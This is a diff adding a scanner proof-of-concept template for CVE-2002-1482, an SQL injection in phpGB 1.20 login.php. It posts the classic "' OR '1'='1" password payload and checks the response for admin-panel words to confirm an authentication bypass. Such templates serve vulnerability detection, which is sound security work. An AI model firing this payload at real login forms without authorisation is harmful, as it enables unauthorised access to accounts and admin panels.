@@ -1,0 +1,34 @@
+[info]
+author = "ave"
+description = "验证 phpGB 1.20 及更早版本 login.php 中的 SQL 注入漏洞，通过在登录表单密码字段注入 SQL 代码绕过身份验证"
+id = "POC-AVE-2002-0603"
+name = "phpGB 1.x login.php SQL Injection PoC"
+severity = "critical"
+tags = ["ave-2002-0603"]
+vuln_id = [
+    "CVE-2002-1482",
+    "AVE-2002-0603",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/login.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=admin&password=' OR '1'='1"
+type = "form"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "admin",
+    "welcome",
+    "logout",
+    "control panel",
+]
